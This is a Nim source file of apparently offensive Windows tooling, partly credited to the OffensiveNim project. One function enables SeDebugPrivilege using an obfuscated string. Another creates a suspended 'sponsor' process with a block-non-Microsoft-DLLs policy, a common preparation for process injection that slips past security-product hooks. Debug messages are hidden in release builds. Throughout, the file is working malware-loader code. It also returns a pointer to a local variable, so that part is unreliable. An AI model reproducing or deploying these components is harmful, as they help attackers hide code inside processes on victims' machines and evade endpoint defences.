import winim
import nimprotect


proc setDebugPrivilege*(): bool =
    # Inits
    var tp : TOKEN_PRIVILEGES
    var luid: LUID 
    var HTtoken: HANDLE
    var lpszPrivilege = protectString("SeDebugPrivilege")
    # Open current process token
    discard OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &HTtoken)
    # Get current privilege
    if LookupPrivilegeValue(NULL, lpszPrivilege, &luid) == 0:
        return false
    # Enable privilege
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED
    tp.PrivilegeCount = 1
    tp.Privileges[0].Luid = luid
    # Set privilege
    if AdjustTokenPrivileges(HTtoken, FALSE, &tp, cast[DWORD](sizeof(TOKEN_PRIVILEGES)), NULL, NULL) == 0:
        return false
    # Success
    return true


# Heavily stolen from https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/blockdlls_acg_ppid_spoof_bin.nim
proc createSuspendedExtendedProcess*(processCmd: cstring, isBlockDlls: bool): PPROCESS_INFORMATION =

    # Some varaibles
    const PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON = 0x00000001 shl 44
    var si: STARTUPINFOEX
    var pi: PROCESS_INFORMATION
    var ps: SECURITY_ATTRIBUTES
    var ts: SECURITY_ATTRIBUTES
    var policy: DWORD64
    var lpSize: SIZE_T

    # Block all non microsoft DLL's policy in new process
    policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON
    
    # Init structs sizes and stuff
    si.StartupInfo.cb = sizeof(si).cint
    ps.nLength = sizeof(ps).cint
    ts.nLength = sizeof(ts).cint
    InitializeProcThreadAttributeList(NULL, 2, 0, addr lpSize)
    si.lpAttributeList = cast[LPPROC_THREAD_ATTRIBUTE_LIST](HeapAlloc(GetProcessHeap(), 0, lpSize))
    InitializeProcThreadAttributeList(si.lpAttributeList, 2, 0, addr lpSize)

    # If isBlockDlls - update policy
    if isBlockDlls:
        if UpdateProcThreadAttribute(
            si.lpAttributeList,
            0,
            cast[DWORD_PTR](PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY),
            addr policy,
            sizeof(policy),
            NULL,
            NULL
        ) != TRUE:
            when not defined(release): echo "[-] Could not update process attribute to block Dlls"
            quit()

    # Create the suspended process
    when not defined(release): echo "[*] Creating sponsor process suspended"
    if CreateProcess(
        NULL,
        newWideCString(processCmd),
        ps,
        ts, 
        FALSE,
        EXTENDED_STARTUPINFO_PRESENT or CREATE_SUSPENDED,
        NULL,
        NULL,
        addr si.StartupInfo,
        addr pi
    ) != TRUE:
        when not defined(release): echo "[-] Could not create process"
        quit()

    # Return updated process information
    return addr pi
